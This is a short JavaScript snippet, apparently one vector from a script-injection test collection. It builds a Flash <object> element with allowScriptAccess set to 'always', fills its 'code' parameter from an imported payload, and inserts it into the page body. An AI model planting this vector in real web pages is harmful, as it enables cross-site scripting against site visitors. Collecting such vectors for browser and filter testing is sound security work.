import { payload } from './source.js';

var objectElement = document.createElement("object");
var paramTypeElement = document.createElement("param");
var paramCodeElement = document.createElement("param");
var paramAllowScriptAccessElement = document.createElement("param");
paramTypeElement.name = "type";
paramTypeElement.value = "application/x-shockwave-flash";
paramAllowScriptAccessElement.name = "allowScriptAccess";
paramAllowScriptAccessElement.value = "always";
paramCodeElement.name = "code";
paramCodeElement.value = payload;
objectElement.appendChild(paramAllowScriptAccessElement);
objectElement.appendChild(paramTypeElement);
objectElement.appendChild(paramCodeElement);
document.body.appendChild(objectElement);